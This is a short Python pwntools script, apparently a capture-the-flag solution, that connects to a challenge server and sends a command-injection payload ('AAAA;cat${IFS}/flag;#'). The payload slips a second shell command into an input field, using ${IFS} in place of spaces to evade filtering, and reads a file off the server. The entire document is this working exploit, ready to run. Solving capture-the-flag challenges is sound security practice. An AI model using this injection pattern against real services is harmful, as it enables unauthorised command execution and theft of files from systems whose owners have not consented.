from pwn import *

HOST, PORT = "escapetoworld.ssectf.kctf.cloud", 1337
payload = b'AAAA;cat${IFS}/flag;#'          # adjust path if needed

io = remote(HOST, PORT)
io.recvuntil(b'Enter your data:')
io.sendline(payload)
print(io.recvall(timeout=3).decode())
